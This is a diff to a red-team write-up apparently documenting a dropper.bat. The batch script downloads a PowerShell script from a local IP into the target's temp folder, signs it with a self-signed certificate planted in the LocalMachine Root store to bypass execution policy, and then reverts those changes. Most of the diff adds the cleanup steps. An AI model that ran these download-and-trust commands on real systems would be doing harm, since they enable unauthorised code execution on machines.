@@ -80,9 +80,11 @@ this certificate in there certificate store ...
 <br />
 
 #### Revert Target System to 'Default' Settings. (non admin privs requiered)
-`cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser`
-![fin](https://user-images.githubusercontent.com/23490060/72699309-ae366400-3b3f-11ea-9397-fc9c2510f907.png)
-
+```
+cd %tmp% && del /F /Q my_posh_script.ps1
+cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser
+powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'} ^| Remove-Item
+```
 ---
 
 <br />
@@ -105,8 +107,7 @@ echo [2] Downloading our PS script to target 'tmp' remote folder.
 powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_posh_script.ps1', '$env:tmp\my_posh_script.ps1')
 timeout /T 2 >nul
 
-echo [3] Digitally sign Our Downloaded PS script (my_posh_script.ps1)
-:: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1) -> { This certificate expires in six months }
+echo [3] Digitally sign Our Downloaded PS script (my_posh_script.ps1) { cert expires in six months }
 powershell $cert = New-SelfSignedCertificate -Subject "My_Code_Signing_Certificate" -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
 timeout /T 2 >nul
 
@@ -116,13 +117,15 @@ pause
 
 
 echo [i] Reverting %userdomain% to Previous State (before dropper.bat exec)
-timeout /T 2 >nul
+timeout /T 3 >nul
 cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser
 echo [i] PowerShell Execution Policy Set to: 'Restricted' ..
 cd %tmp% && del /F /Q my_posh_script.ps1
 echo [i] my_posh_script.ps1 deleted from: %tmp% ..
 timeout /T 2 >nul
-echo [i] Remmenber to delete the 'certificate' from 'certlm.msc' cert store ..
+echo [i] Deleting 'SsaRedTeam' (FriendlyName) Certificate from Cert Store ..
+powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'}
+powershell Get-ChildItem Cert:\LocalMachine\Root ^| Where-Object {$_.Issuer -match 'My_Code_Signing_Certificate'} ^| Remove-Item
 pause
 ```
 
@@ -136,7 +139,7 @@ its set by Default to powershell Scripts Only (this policy does not affects batc
 <br />
 
 ### Final Notes:
-- 1º - This Batch script will revert target machine to previous state, by setting the PS policy<br />
-       to **'Restricted'** (default) and by deleting **'my_posh_script.ps1'** from **%tmp%** remote folder ..
-- 2º - Remmenber to delete the certificate from **certlm.msc** cert store (LocalMachine\Root) ..<br />
-**{ For easy find in the cert store, I have set the certificate -FriendlyName as "SsaRedTeam" }**
+- This Batch script in the end will revert target machine to previous state (before dropper.bat exec), by setting<br />
+  the PS Execution Policy to **'Restricted'** (default), by deleting **'my_posh_script.ps1'** from **%tmp%** remote<br />
+  folder and deletes the created certificate by **Issuer** (CN) Name { **CN=My_Code_Signing_Certificate** } ..
+
